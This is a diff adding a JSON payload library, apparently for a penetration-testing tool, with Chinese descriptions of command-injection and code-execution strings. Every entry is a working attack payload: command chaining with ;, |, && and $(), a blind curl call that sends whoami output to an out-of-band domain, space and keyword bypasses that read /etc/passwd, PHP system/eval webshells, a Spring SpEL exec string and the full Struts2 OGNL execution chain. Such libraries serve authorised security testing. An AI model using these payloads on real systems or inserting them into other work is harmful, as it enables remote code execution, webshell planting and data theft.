@@ -1,0 +1,184 @@
+{
+  "kind": "payload",
+  "version": 1,
+  "group": "命令注入 / 代码执行",
+  "categories": ["命令拼接", "盲注带外", "绕过技巧", "PHP 代码执行", "Java 表达式"],
+  "items": [
+    {
+      "id": "rce-semicolon-id",
+      "title": "分号拼接命令",
+      "category": "命令拼接",
+      "code": "; id",
+      "desc": "在原有命令后追加新命令，用于验证是否存在命令拼接。",
+      "tags": ["rce", "command", "basic"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP WSTG / PayloadsAllTheThings"
+    },
+    {
+      "id": "rce-pipe-whoami",
+      "title": "管道符执行",
+      "category": "命令拼接",
+      "code": "| whoami",
+      "desc": "使用管道符把左侧输出交给新命令，常用于 Linux 目标。",
+      "tags": ["rce", "command", "pipe"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP WSTG"
+    },
+    {
+      "id": "rce-andand",
+      "title": "逻辑与执行",
+      "category": "命令拼接",
+      "code": "&& whoami",
+      "desc": "前一条命令成功后执行新命令，回显更稳定。",
+      "tags": ["rce", "command"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP WSTG"
+    },
+    {
+      "id": "rce-backtick",
+      "title": "反引号命令替换",
+      "category": "命令拼接",
+      "code": "`id`",
+      "desc": "利用命令替换语法在参数中执行命令，适用于命令被包裹在字符串中的场景。",
+      "tags": ["rce", "command", "substitution"],
+      "vars": [],
+      "risk": "attack",
+      "source": "PayloadsAllTheThings"
+    },
+    {
+      "id": "rce-dollar-paren",
+      "title": "美元符命令替换",
+      "category": "命令拼接",
+      "code": "$(id)",
+      "desc": "POSIX 命令替换写法，常与双引号参数配合使用。",
+      "tags": ["rce", "command", "substitution"],
+      "vars": [],
+      "risk": "attack",
+      "source": "PayloadsAllTheThings"
+    },
+    {
+      "id": "rce-newline",
+      "title": "换行符注入",
+      "category": "命令拼接",
+      "code": "%0aid",
+      "desc": "通过换行符截断原命令并执行新命令，注意目标是否做 URL 解码。",
+      "tags": ["rce", "command", "encoding"],
+      "vars": [],
+      "risk": "attack",
+      "source": "PayloadsAllTheThings"
+    },
+    {
+      "id": "rce-win-amp",
+      "title": "Windows 命令拼接",
+      "category": "命令拼接",
+      "code": "& whoami",
+      "desc": "Windows cmd 下的命令分隔符，用于 Windows 目标验证。",
+      "tags": ["rce", "windows", "command"],
+      "vars": [],
+      "risk": "attack",
+      "source": "PayloadsAllTheThings"
+    },
+    {
+      "id": "rce-blind-dnslog",
+      "title": "盲打 DNSLog",
+      "category": "盲注带外",
+      "code": "; curl http://{{domain}}/$(whoami)",
+      "desc": "无回显时通过带外请求把执行结果带出，需要自建 DNSLog 平台。",
+      "tags": ["rce", "blind", "oob", "dnslog"],
+      "vars": ["domain"],
+      "risk": "attack",
+      "source": "OWASP WSTG"
+    },
+    {
+      "id": "rce-blind-sleep",
+      "title": "时间盲注探测",
+      "category": "盲注带外",
+      "code": "; sleep 5",
+      "desc": "通过响应延迟判断命令是否执行，适合完全无回显场景。",
+      "tags": ["rce", "blind", "time"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP WSTG"
+    },
+    {
+      "id": "rce-space-bypass",
+      "title": "空格过滤绕过",
+      "category": "绕过技巧",
+      "code": ";cat${IFS}/etc/passwd",
+      "desc": "使用 ${IFS} 替代空格，绕过对空格的过滤。",
+      "tags": ["rce", "bypass", "waf"],
+      "vars": [],
+      "risk": "attack",
+      "source": "PayloadsAllTheThings"
+    },
+    {
+      "id": "rce-concat-bypass",
+      "title": "关键词拼接绕过",
+      "category": "绕过技巧",
+      "code": ";c'a't /etc/passwd",
+      "desc": "使用引号拼接关键字，绕过对 cat 等命令名的黑名单。",
+      "tags": ["rce", "bypass", "waf"],
+      "vars": [],
+      "risk": "attack",
+      "source": "PayloadsAllTheThings"
+    },
+    {
+      "id": "rce-php-system",
+      "title": "PHP system 执行",
+      "category": "PHP 代码执行",
+      "code": "<?php system($_GET['c']); ?>",
+      "desc": "常见 PHP 一句话代码执行写法，仅用于授权测试环境验证。",
+      "tags": ["rce", "php", "webshell"],
+      "vars": [],
+      "risk": "attack",
+      "source": "PayloadsAllTheThings"
+    },
+    {
+      "id": "rce-php-eval",
+      "title": "PHP eval 执行",
+      "category": "PHP 代码执行",
+      "code": "<?php eval($_POST['c']); ?>",
+      "desc": "eval 可执行任意 PHP 代码，检测时注意是否被禁用函数拦截。",
+      "tags": ["rce", "php", "eval"],
+      "vars": [],
+      "risk": "attack",
+      "source": "PayloadsAllTheThings"
+    },
+    {
+      "id": "rce-php-preg-replace",
+      "title": "preg_replace /e 修饰符",
+      "category": "PHP 代码执行",
+      "code": "preg_replace('/.*/e', 'system(\"id\")', 'x');",
+      "desc": "PHP 5.5 之前 /e 修饰符会把替换结果当作代码执行，老系统审计时关注。",
+      "tags": ["rce", "php", "legacy"],
+      "vars": [],
+      "risk": "attack",
+      "source": "PHP 官方文档 / 历史漏洞"
+    },
+    {
+      "id": "rce-spel",
+      "title": "Spring SpEL 表达式",
+      "category": "Java 表达式",
+      "code": "${T(java.lang.Runtime).getRuntime().exec(\"id\")}",
+      "desc": "Spring Expression Language 注入的典型利用串，用于验证 SpEL 注入。",
+      "tags": ["rce", "java", "spel", "spring"],
+      "vars": [],
+      "risk": "attack",
+      "source": "Spring 官方文档 / 公开漏洞分析"
+    },
+    {
+      "id": "rce-ognl",
+      "title": "Struts2 OGNL 表达式",
+      "category": "Java 表达式",
+      "code": "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",
+      "desc": "Struts2 S2 系列漏洞的通用 OGNL 执行链，仅用于授权测试。",
+      "tags": ["rce", "java", "struts2", "ognl"],
+      "vars": [],
+      "risk": "attack",
+      "source": "公开漏洞分析 / Struts2 S2-045 等"
+    }
+  ]
+}
